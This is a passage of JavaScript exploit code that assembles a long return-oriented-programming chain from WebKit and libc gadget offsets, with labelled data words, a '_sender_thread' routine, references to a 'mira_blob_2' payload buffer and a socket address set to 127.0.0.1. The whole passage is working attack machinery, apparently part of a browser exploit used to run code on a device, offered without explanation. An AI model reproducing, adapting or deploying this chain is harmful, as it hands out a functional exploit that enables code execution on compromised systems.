ropchain+171496, //L2546
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+171480, //L2545
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2544:
db([48, 0]); // 0x30
set_gadget(webkit_base+3789839,); //pop r11
//L2545:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2546:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857161, //shl rax, cl
libc_base+857183, //shr rax, cl
libc_base+713278, //pop rsi
ropchain+171600, //L2548
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+171584, //L2547
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2547:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2548:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+171696, //L2550
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2549:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L2550:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+171800, //L2553
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+171784, //L2552
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2552:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2553:
db([0, 0]); // 0x0
set_gadgets([
libc_base+229840, //mov ax, [rdi]
libc_base+713278, //pop rsi
ropchain+171960, //L2558
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+171928, //L2556
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+171944, //L2557
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2555:
db([16, 0]); // 0x10
set_gadget(libc_base+165442,); //pop rdi
//L2556:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2557:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2558:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857161, //shl rax, cl
libc_base+713278, //pop rsi
ropchain+172016, //L2559
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+165442 //pop rdi
]);
//L2559:
db([0, 0]); // 0x0
set_gadgets([
libc_base+288783, //sar edi, cl
libc_base+713278, //pop rsi
ropchain+172144, //L2562
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+172160, //L2563
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+172128, //L2561
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2561:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2562:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2563:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+172320, //L2567
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+172288, //L2565
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+172304, //L2566
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2564:
db([48, 0]); // 0x30
set_gadget(libc_base+165442,); //pop rdi
//L2565:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2566:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2567:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857161, //shl rax, cl
libc_base+857183, //shr rax, cl
libc_base+713278, //pop rsi
ropchain+172424, //L2569
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+172408, //L2568
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2568:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2569:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+772328 //pop rcx
]);
//L2570:
db([8, 0]); // 0x8
set_gadget(libc_base+768796,); //pop rax
//L2571:
db([8, 0]); // 0x8
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+172624, //L2574
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+172608, //L2573
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2572:
db([32, 0]); // 0x20
set_gadget(webkit_base+3789839,); //pop r11
//L2573:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2574:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857161, //shl rax, cl
libc_base+857183, //shr rax, cl
libc_base+713278, //pop rsi
ropchain+172728, //L2576
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+172712, //L2575
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2575:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2576:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857183, //shr rax, cl
libc_base+713278, //pop rsi
ropchain+172840, //L2579
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+172824, //L2578
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2577:
db([48, 0]); // 0x30
set_gadget(webkit_base+3789839,); //pop r11
//L2578:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2579:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857161, //shl rax, cl
libc_base+857183, //shr rax, cl
libc_base+713278, //pop rsi
ropchain+172904, //L2580
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+772328 //pop rcx
]);
//L2580:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+172960, //L2582
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2582:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
webkit_base+72932, //or rax, rcx
libc_base+713278, //pop rsi
ropchain+173096, //L2584
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+173128, //L2586
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+173112, //L2585
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L2584:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2585:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2586:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+173288, //L2590
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+173256, //L2588
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+173272, //L2589
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2587:
db([48, 0]); // 0x30
set_gadget(libc_base+165442,); //pop rdi
//L2588:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2589:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2590:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857161, //shl rax, cl
libc_base+857183, //shr rax, cl
libc_base+713278, //pop rsi
ropchain+173408, //L2591
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+173440, //L2593
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278, //pop rsi
ropchain+173424, //L2592
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2591:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2592:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2593:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+173544, //L2594
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+173560, //L2595
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1420514 //pop r8
]);
//L2594:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2595:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+173680, //L2596
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+173664, //L2597
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L2597:
db([0, 0]); // 0x0
set_gadget(libc_base+489696,); //pop rsp
//L2596:
db([0, 0]); // 0x0
set_gadgets([
libc_base+713278, //pop rsi
ropchain+173768, //L2599
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278, //pop rsi
ropchain+173752, //L2598
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L2598:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2599:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+173872, //L2600
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+173888, //L2601
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1420514 //pop r8
]);
//L2600:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2601:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+174008, //L2602
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+173992, //L2603
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L2603:
db([0, 0]); // 0x0
set_gadget(libc_base+489696,); //pop rsp
//L2602:
db([0, 0]); // 0x0
//_sender_thread:
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+174080, //L2605
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
webkit_base+1420514 //pop r8
]);
//L2605:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+174144, //L2606
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
webkit_base+1420514 //pop r8
]);
//L2606:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([48, 0]); // 0x30
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2608:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+772328, //pop rcx
//L2609:
(window.mira_blob_2||0),
libc_base+507828, //add rax, rsi
webkit_base+2989859, //mov [rax], rcx
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2611:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+772328, //pop rcx
//L2612:
(window.mira_blob_2_len||0),
libc_base+507828, //add rax, rsi
webkit_base+972324, //mov [rax], ecx
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2614:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+174408, //L2617
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+174392, //L2616
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2616:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2617:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+174568, //L2622
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+174536, //L2620
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+174552, //L2621
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+713278 //pop rsi
]);
//L2619:
db([0, 0]); // 0x0
set_gadget(libc_base+772328,); //pop rcx
//L2620:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2621:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2622:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11809960, //cmp rax, rsi ; sete al
libc_base+232261, //movzx eax, al
libc_base+713278, //pop rsi
ropchain+174688, //L2623
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+174720, //L2625
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+174704, //L2624
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L2623:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2624:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2625:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+174864, //L2629
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+174880, //L2630
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+174848, //L2628
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+713278 //pop rsi
]);
//L2627:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2628:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2629:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2630:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11809960, //cmp rax, rsi ; sete al
libc_base+232261, //movzx eax, al
webkit_base+426067, //shl rax, 3
libc_base+713278, //pop rsi
ropchain+174992, //L2631+8
libc_base+507828, //add rax, rsi
libc_base+145226, //mov rax, [rax]
libc_base+713278, //pop rsi
ropchain+174984, //L2631
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+489696 //pop rsp
]);
//L2631:
db([0, 0]); // 0x0
set_gadgets([
ropchain+175008, //L2631+24
ropchain+175328, //L2626
libc_base+740138, //mov rax, r8
libc_base+713278, //pop rsi
ropchain+175064, //L2633
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2632:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2633:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2634:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+175184, //L2635
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+175200, //L2636
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1420514 //pop r8
]);
//L2635:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2636:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+175320, //L2637
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+175304, //L2638
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L2638:
db([0, 0]); // 0x0
set_gadget(libc_base+489696,); //pop rsp
//L2637:
db([0, 0]); // 0x0
//L2626:
set_gadget(libc_base+768796,); //pop rax
//L2639:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+768796, //pop rax
//L2641:
ropchain+224616, //L2640
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+768796, //pop rax
//L2643:
ropchain+175488, //L2642
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+489696, //pop rsp
ropchain+188528, //L2644
//L2642:
libc_base+863109, //mov rax, rcx
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+175560, //L2645
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2645:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2646:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+768796 //pop rax
]);
//L2647:
db([1, 0]); // 0x1
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+768796 //pop rax
]);
//L2648:
db([2, 0]); // 0x2
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+768796, //pop rax
//L2650:
ropchain+175776, //L2649
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+489696, //pop rsp
ropchain+189856, //L2651
//L2649:
libc_base+863109, //mov rax, rcx
libc_base+713278 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+175864, //L2653
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2652:
db([4294967280, 4294967295]); // -0x10
set_gadget(libc_base+772328,); //pop rcx
//L2653:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
webkit_base+972324, //mov [rax], ecx
libc_base+388400, //mov rax, rdi
libc_base+772328 //pop rcx
]);
//L2655:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+887232, //mov [rax], cl
libc_base+713278, //pop rsi
ropchain+175968, //L2658
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+713278 //pop rsi
]);
//L2657:
db([1, 0]); // 0x1
set_gadget(libc_base+768796,); //pop rax
//L2658:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+388400, //mov rax, rdi
libc_base+772328 //pop rcx
]);
//L2659:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+887232, //mov [rax], cl
libc_base+713278, //pop rsi
ropchain+176064, //L2662
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+713278 //pop rsi
]);
//L2661:
db([1, 0]); // 0x1
set_gadget(libc_base+768796,); //pop rax
//L2662:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
webkit_base+887232, //mov [rax], cl
libc_base+713278, //pop rsi
ropchain+176136, //L2664
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+713278 //pop rsi
]);
//L2663:
db([1, 0]); // 0x1
set_gadget(libc_base+768796,); //pop rax
//L2664:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
webkit_base+887232, //mov [rax], cl
libc_base+713278, //pop rsi
ropchain+176208, //L2666
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+713278 //pop rsi
]);
//L2665:
db([1, 0]); // 0x1
set_gadget(libc_base+768796,); //pop rax
//L2666:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
webkit_base+887232, //mov [rax], cl
libc_base+713278, //pop rsi
ropchain+176280, //L2668
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+713278 //pop rsi
]);
//L2667:
db([1, 0]); // 0x1
set_gadget(libc_base+768796,); //pop rax
//L2668:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
webkit_base+887232, //mov [rax], cl
libc_base+713278, //pop rsi
ropchain+176352, //L2670
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+713278 //pop rsi
]);
//L2669:
db([1, 0]); // 0x1
set_gadget(libc_base+768796,); //pop rax
//L2670:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
webkit_base+887232, //mov [rax], cl
libc_base+713278, //pop rsi
ropchain+176424, //L2672
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+713278 //pop rsi
]);
//L2671:
db([1, 0]); // 0x1
set_gadget(libc_base+768796,); //pop rax
//L2672:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
webkit_base+887232, //mov [rax], cl
libc_base+713278, //pop rsi
ropchain+176496, //L2674
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+713278 //pop rsi
]);
//L2673:
db([1, 0]); // 0x1
set_gadget(libc_base+768796,); //pop rax
//L2674:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
webkit_base+887232, //mov [rax], cl
libc_base+713278, //pop rsi
ropchain+176568, //L2676
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+713278 //pop rsi
]);
//L2675:
db([1, 0]); // 0x1
set_gadget(libc_base+768796,); //pop rax
//L2676:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2677:
db([4294967265, 4294967295]); // -0x1f
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+176664, //L2680
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2679:
db([2, 0]); // 0x2
set_gadget(libc_base+768796,); //pop rax
//L2680:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+887232, //mov [rax], cl
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2681:
db([4294967266, 4294967295]); // -0x1e
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+176768, //L2684
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+772328 //pop rcx
]);
//L2683:
db([15651, 0]); // 0x3d23
set_gadget(libc_base+165442,); //pop rdi
//L2684:
db([0, 0]); // 0x0
set_gadgets([
libc_base+524088, //mov [rdi], cx
libc_base+713278, //pop rsi
ropchain+176840, //L2687
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2686:
db([4294967268, 4294967295]); // -0x1c
set_gadget(libc_base+165442,); //pop rdi
//L2687:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+176904, //L2690
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2689:
db([16777343, 0]); // 0x100007f
set_gadget(libc_base+768796,); //pop rax
//L2690:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+972324, //mov [rax], ecx
libc_base+713278, //pop rsi
ropchain+176952, //L2691
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2691:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2692:
db([16, 0]); // 0x10
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+740138, //mov rax, r8
libc_base+713278, //pop rsi
ropchain+177064, //L2694
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+713278 //pop rsi
]);
//L2693:
db([4294967264, 4294967295]); // -0x20
set_gadget(libc_base+768796,); //pop rax
//L2694:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+177168, //L2696
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2695:
db([4294967280, 4294967295]); // -0x10
set_gadget(libc_base+772328,); //pop rcx
//L2696:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+177272, //L2699
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+177256, //L2698
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2698:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2699:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
